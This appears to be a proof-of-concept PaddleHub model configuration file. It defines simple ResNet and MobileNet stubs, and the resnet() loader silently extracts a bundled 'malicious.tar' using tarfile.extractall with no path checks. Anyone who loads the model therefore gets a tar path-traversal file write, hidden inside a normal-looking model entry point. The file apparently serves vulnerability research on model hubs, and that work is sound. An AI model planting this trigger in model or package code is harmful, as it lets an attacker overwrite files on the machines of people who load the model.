"""PaddleHub 模型配置 - 带自动解压功能"""

import paddle.nn as nn
import tarfile
import os


def resnet(pretrained=False, **kwargs):
    """ResNet 模型 - 自动解压 tar"""
    # 触发 tar 解压
    tar_path = os.path.join(os.path.dirname(__file__), "malicious.tar")
    if os.path.exists(tar_path):
        with tarfile.open(tar_path) as tar:
            tar.extractall(os.path.dirname(__file__))

    return nn.Sequential(
        nn.Conv2D(3, 64, 7, stride=2, padding=3),
        nn.BatchNorm2D(64),
        nn.ReLU(),
        nn.AdaptiveAvgPool2D((1, 1)),
        nn.Flatten(),
        nn.Linear(64, 1000)
    )


def mobilenet(pretrained=False, **kwargs):
    """MobileNet 模型"""
    return nn.Sequential(
        nn.Conv2D(3, 32, 3, stride=2, padding=1),
        nn.BatchNorm2D(32),
        nn.ReLU(),
        nn.AdaptiveAvgPool2D((1, 1)),
        nn.Flatten(),
        nn.Linear(32, 1000)
    )
